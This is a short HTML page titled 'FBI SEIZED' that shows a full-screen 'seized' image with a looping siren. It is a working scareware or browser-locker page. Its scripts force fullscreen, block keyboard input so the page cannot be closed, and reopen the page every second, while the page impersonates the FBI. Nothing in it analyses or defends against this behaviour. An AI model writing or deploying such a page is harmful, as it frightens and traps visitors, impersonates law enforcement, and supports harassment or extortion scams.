<!DOCTYPE html>
<html>
<head>
    <title>FBI SEIZED</title>
    <style>
        body {
            background-color: black;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        img {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }
    </style>
    <script>
        function fullScreen() {
            document.documentElement.requestFullscreen();
        }
        window.onload = fullScreen;
    </script>
    
    <script>
    document.addEventListener("keydown", function(event) {
        event.preventDefault(); // Blocks closing with keyboard
    });
    setInterval(() => {
        window.open("seized.html"); // Keeps reopening the page
    }, 1000);
</script>

<script>
    setInterval(() => {
        document.getElementById("siren").play();
    }, 500);
</script>

</head>
<body>
    <img src="seized.jpg" alt="FBI Seized">
    <audio id="siren" autoplay loop>
        <source src="siren.mp3" type="audio/mpeg">
    </audio>
</body>
</html>
